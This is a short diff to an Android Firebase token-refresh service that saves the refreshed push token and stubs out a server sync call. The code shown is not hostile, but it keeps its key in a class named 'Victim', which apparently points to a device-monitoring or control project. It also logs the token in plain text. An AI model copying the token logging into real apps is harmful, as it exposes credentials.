@@ -15,9 +15,22 @@ public class InstanceIdService extends FirebaseInstanceIdService {
 
     @Override
     public void onTokenRefresh() {
+
         final String refreshedToken = FirebaseInstanceId.getInstance().getToken();
         Log.i(X, "Firebase token refreshed : " + refreshedToken);
-        PrefUtils.getInstance(this).saveString(Victim.KEY_FCM_ID, refreshedToken);
-        //TODO: Update FCM here...
+
+        final PrefUtils prefUtils = PrefUtils.getInstance(this);
+
+        prefUtils.getEditor()
+                .putString(Victim.KEY_FCM_ID, refreshedToken)
+                .putBoolean(PrefUtils.IS_FCM_SYNCED, false)
+                .commit();
+
+        new APIRequestGateway(this, new APIRequestGateway.APIRequestGatewayCallback() {
+            @Override
+            public void onReadyToRequest(String apiKey) {
+                //TODO: Create a server route to update the FCM id.
+            }
+        });
     }
 }
